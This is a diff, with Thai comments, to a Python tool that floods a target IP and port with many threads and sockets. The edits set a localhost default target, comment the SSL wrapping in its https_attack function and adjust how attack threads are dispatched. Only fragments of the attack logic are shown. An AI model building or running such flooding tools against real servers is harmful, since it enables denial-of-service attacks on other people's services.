@@ -114,7 +114,7 @@ Socks       : {num_sockets}
 
 parser = argparse.ArgumentParser(description=banner, add_help=False)
 parser.add_argument("-h", "--help", action='store_true', dest="help_menu", required=False, help="Help menu")
-parser.add_argument("--ip", required=False, help="Target IP")  # ใช้ --ip แทน -ip=
+parser.add_argument("--ip", required=False, default="127.0.0.1", help="Target IP")  # ใช้ --ip แทน -ip=
 parser.add_argument("-p", "--port", type=int, required=False, default=80, help="Target Port number")  # รองรับ -p หรือ --port
 parser.add_argument("-ths", "--threads", type=int, default=100, help="Number of threads to use")
 parser.add_argument("--num-socks", "-n-socks", type=int, required=False, default=1000, help="Number of Socks to use (default: 1000)")
@@ -430,6 +430,7 @@ def https_attack():
         raw_sock.settimeout(3)
         raw_sock.connect((target_ip, port_target))
 
+        # ห่อด้วย SSL เพื่อให้คุยกับ HTTPS ได้
         context = ssl.create_default_context()
         s = context.wrap_socket(raw_sock, server_hostname=target_ip)
 
@@ -527,7 +528,8 @@ if check_target(target_ip, port_target):
         # Https Attak
         elif args.port == 443:
             t = threading.Thread(target=https_attack, daemon=True)
- 
+
+        # 
         else:
             t = threading.Thread(target=main_attack, daemon=True)
         t.start()
@@ -536,3 +538,5 @@ if check_target(target_ip, port_target):
 
 else:
     print(f"[{back_colors['red']}!{back_colors['reset']}] {styles['bright']}Target not reachable. Aborting.{styles['reset']}")
+
+# กัน script หลุด
